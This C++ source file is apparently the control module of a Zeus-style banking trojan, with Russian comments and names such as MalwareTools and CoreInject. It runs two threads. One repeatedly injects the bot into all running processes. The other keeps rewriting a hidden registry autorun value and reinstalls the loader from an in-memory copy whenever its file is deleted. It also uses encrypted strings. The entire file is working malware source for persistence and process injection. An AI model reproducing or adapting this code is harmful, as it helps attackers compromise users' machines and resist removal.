#include <windows.h>
#include <wininet.h>
#include <shlwapi.h>

#include "defines.h"
#include "core.h"
#include "corehook.h"
#include "coreinject.h"
#include "corecontrol.h"
#include "cryptedstrings.h"
#include "coreinstall.h"

#include "..\common\str.h"
#include "..\common\debug.h"
#include "..\common\sync.h"
#include "..\common\registry.h"
#include "..\common\fs.h"

void CoreControl::init(void)
{

}

void CoreControl::uninit(void)
{

}

static bool saveFile(const void *data, DWORD dataSize, LPWSTR fileName, bool infinite)
{
  //Иногда файл чемто занять после завершения процесса. Ждем...
  for(BYTE loop = 0;; loop++)
  {
    CWA(kernel32, SetFileAttributesW)(fileName, FILE_ATTRIBUTE_ARCHIVE);
    if(Fs::_saveToFile(fileName, data, dataSize))
    {
      return true;
    }
    else
    {
      WDEBUG0(WDDT_ERROR, "Failed to save PE file.");
      if(infinite == false && loop == 10)break;
    }
    CWA(kernel32, Sleep)(5000 + loop);
  }

  return false;
}

static DWORD WINAPI procInfection(void *)
{
  CoreHook::disableFileHookerForCurrentThread(true);

  //FIXME: защита файлов бота, если не влючен TT защищаемся также от чтения.  
  //FIXME: защита реестра, путем восстановления.
  
  HANDLE mutex = Core::waitForMutexOfObject(Core::OBJECT_ID_CONTROL_INFECTION, MalwareTools::KON_SESSION);
  if(mutex == NULL)
  {
    WDEBUG0(WDDT_ERROR, "Failed.");
    return 1;
  }

  WDEBUG0(WDDT_INFO, "Started.");
  if(Core::isActive())
  {
    CWA(kernel32, SetThreadPriority)(CWA(kernel32, GetCurrentThread)(), THREAD_PRIORITY_IDLE);
    while(CWA(kernel32, WaitForSingleObject)(coreData.globalHandles.stopEvent, 5000) == WAIT_TIMEOUT)CoreInject::_injectToAll();
  }

  WDEBUG0(WDDT_INFO, "Stopped.");
  Sync::_freeMutex(mutex);

  return 0;
}

static DWORD WINAPI procAutorun(void *)
{
  CoreHook::disableFileHookerForCurrentThread(true);
  CWA(kernel32, SetThreadPriority)(CWA(kernel32, GetCurrentThread)(), THREAD_PRIORITY_NORMAL);

  WCHAR autorunName[50];
  WCHAR processPath[MAX_PATH];
  WCHAR processPathWOQuotes[MAX_PATH];
  DWORD processPathSize;

  Core::getPeSettingsPath(Core::PSP_COREFILE, processPath);
  Fs::MEMFILE temp,copyOfLoader;
  if(!Fs::_fileToMem(processPath, &temp, 0))WDEBUG0(WDDT_ERROR, "Error while mapping loader.");
  copyOfLoader.data = (LPBYTE)Mem::copyEx(temp.data,temp.size);
  copyOfLoader.size = temp.size;
  copyOfLoader.file=(HANDLE)-1;
  Fs::_closeMemFile(&temp);
  if(copyOfLoader.data == NULL || copyOfLoader.size == 0)WDEBUG0(WDDT_ERROR, "Error while copying mapped loader.");
  HANDLE mutex = Core::waitForMutexOfObject(Core::OBJECT_ID_CONTROL_AUTORUN, MalwareTools::KON_SESSION);
  if(mutex == NULL)
  {
    WDEBUG0(WDDT_ERROR, "Failed");
    return 1;
  }

  WDEBUG0(WDDT_INFO, "Started.");

  
  
  Core::generateObjectName(Core::OBJECT_ID_REG_AUTORUN, autorunName, MalwareTools::KON_DEFAULT);
  
  
  Str::_CopyW(processPathWOQuotes,processPath,-1);
  
  CWA(shlwapi, PathQuoteSpacesW)(processPath);
  processPathSize = Str::_LengthW(processPath);
  
  //if(!copyOfLoader)WDEBUG0(WDDT_INFO, "copyOfLoader is NULL");
  
  //Цикл.
  if(Core::isActive())
  {
    CSTR_GETW(regPath, regpath_autorun);
    while(CWA(kernel32, WaitForSingleObject)(coreData.globalHandles.stopEvent, 200) == WAIT_TIMEOUT)
    {
      Registry::_setValueAsString(HKEY_CURRENT_USER, regPath, autorunName, processPath, processPathSize);
	  if(GetFileAttributesW(processPathWOQuotes) == INVALID_FILE_ATTRIBUTES)
	  {
		  WDEBUG4(WDDT_INFO, "home: %s, processPath: %s, copyofloader: %u, %u byte", coreData.paths.home, processPath,(void*)copyOfLoader.data,copyOfLoader.size);
		  CoreInstall::_refresh(coreData.paths.home, processPath, &copyOfLoader);
		  Str::_CopyW(autorunName,PathFindFileNameW(processPath),-1);
		  Str::_CopyW(processPathWOQuotes, processPath, -1);
		  PathQuoteSpacesW(processPath);
		  processPathSize = Str::_LengthW(processPath);

	  }
    }
  }
  WDEBUG0(WDDT_INFO, "Stopped.");
  Sync::_freeMutex(mutex);

  return 0;
}

bool CoreControl::_create(ThreadsGroup::GROUP *group)
{
  bool ok1 = ThreadsGroup::_createThread(group, 0, procInfection, NULL, NULL, NULL);
  bool ok2 = ThreadsGroup::_createThread(group, 0, procAutorun, NULL, NULL, NULL);
  return (ok1 || ok2);
}

bool CoreControl::_removeAutorun(void)
{
  WCHAR autorunName[50];
  Core::generateObjectName(Core::OBJECT_ID_REG_AUTORUN, autorunName, MalwareTools::KON_DEFAULT);
  
  CSTR_GETW(regPath, regpath_autorun);
  for(BYTE i = 0; i < 5; i++)
  {
    if(!Registry::_deleteValue(HKEY_CURRENT_USER, regPath, autorunName))return false;
    
    //Страховка от незавершенного procAutorun().
    CWA(kernel32, Sleep)(500);
    if(!Registry::_valueExists(HKEY_CURRENT_USER, regPath, autorunName))return true;
  }
  return false;
}
